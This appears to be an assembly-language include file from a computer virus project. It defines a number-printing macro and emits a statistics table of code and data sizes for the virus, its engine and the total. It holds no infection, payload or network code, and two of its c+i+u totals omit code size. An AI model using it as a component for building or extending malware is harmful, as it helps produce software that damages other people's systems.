
emit_num        macro   h,y

                x       = y


                if      h eq 0

                i       = 100000
                j       = 0
                rept    6
                if      (x/i mod 10 eq 0) and (j eq 0)
                db      ' '
                else
                db      x/i mod 10 + '0'
                j       = 1
                endif
                i       = i/10
                endm

                db      ' '

                endif
                if      h eq 1

                db      ' '

                i       = 10000h
                rept    5
                if      x/i mod 16 ge 10
                db      x/i mod 16-10 + 'A'
                else

                if      (i eq 10000h) and (x/i mod 16 eq 0)
                db      ' '
                else
                db      x/i mod 16 + '0'
                endif

                endif

                i       = i/16
                endm

                db      ' '

                endif

                endm

db 13,10

db 13,10
db 13,10
db 13,10

db '*** STATISTICS ***',13,10

h = 0
rept 2

db 13,10
db '                    code  idata    c+i  udata  c+i+u',13,10
db '                  ------ ------ ====== ------ ======',13,10
db 'virus w/o engine  '
emit_num h,virus_c_size-engine_c_size
emit_num h,virus_i_size-engine_i_size
emit_num h,virus_c_size+virus_i_size-engine_c_size-engine_i_size
emit_num h,virus_u_size-engine_u_size
emit_num h,virus_c_size+virus_i_size+virus_u_size-engine_c_size-engine_i_size-engine_u_size
db 13,10
db 'engine            '
emit_num h,engine_c_size
emit_num h,engine_i_size
emit_num h,engine_c_size+engine_i_size
emit_num h,engine_u_size
emit_num h,engine_i_size+engine_u_size
db 13,10
db 'TOTAL             '
emit_num h,virus_c_size
emit_num h,virus_i_size
emit_num h,virus_c_size+virus_i_size
emit_num h,virus_u_size
emit_num h,virus_i_size+virus_u_size
db 13,10

h = h + 1
endm

db 13,10
db 13,10
db 13,10
